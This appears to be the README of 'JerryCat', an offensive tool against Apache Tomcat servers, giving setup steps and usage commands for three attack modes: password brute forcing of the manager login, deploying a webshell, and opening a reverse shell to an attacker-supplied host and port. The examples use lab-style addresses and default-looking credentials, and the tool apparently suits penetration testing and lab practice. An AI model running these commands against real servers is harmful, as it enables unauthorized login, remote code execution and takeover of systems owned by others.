<h1 align="center">JerryCat 🐭<h1>

![](https://github.com/user-attachments/assets/4250ae4e-f82a-4d4f-b34c-91c2f7921d23)


<p align="center">
  <img alt="Version" src="https://img.shields.io/badge/version-1.1-blue.svg?cacheSeconds=2592000" />
  <a href="https://github.com/Ruulian/wconsole_extractor/blob/main/LICENSE" target="_blank">
    <img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-gray.svg" />
  </a>
  </br>
  <a href="https://twitter.com/Talace_" target="_blank">
    <img alt="Twitter: Talace_" src="https://img.shields.io/twitter/follow/Talace_.svg?style=social" />
  </a>
  <a href="https://twitter.com/LeandreOnizuka" target="_blank">
    <img alt="Twitter: LeandreOnizuka" src="https://img.shields.io/twitter/follow/LeandreOnizuka.svg?style=social" />
  </a>
</p>

## Features/Mode ⚒️

 - [x] [Brute Force (brute)](#brute-force)
 - [x] [Webshell (exec)](#webshell)
 - [x] [Reverse shell (reverse)](#reverse-shell)

## Setup ✨

Clone & install dependencies
```sh
git clone https://github.com/TheF0rceAwak5ns/JerryCat.git && cd JerryCat && pip install -r requirements.txt
```

## Usage - Unauthenticated attack 

### Brute Force
**without** a user list
```sh
python3 jerrycat.py brute http://10.10.10.10:8080/ -P resources/password-list-common-tomcat.txt
```
**with** a user list
```sh
python3 jerrycat.py brute http://10.10.10.10:8080/ -U /path/to/user/list -P resources/password-list-common-tomcat.txt
```

## Usage - Authenticated attack

### Webshell
```sh
python3 jerrycat.py exec http://10.10.10.10:8080/ -u tomcat -p s3cret
```

### Reverse shell
```sh
python3 jerrycat.py reverse http://10.10.10.10:8080/ -u tomcat -p s3cret --lhost 10.10.10.10 --lport 4444
```





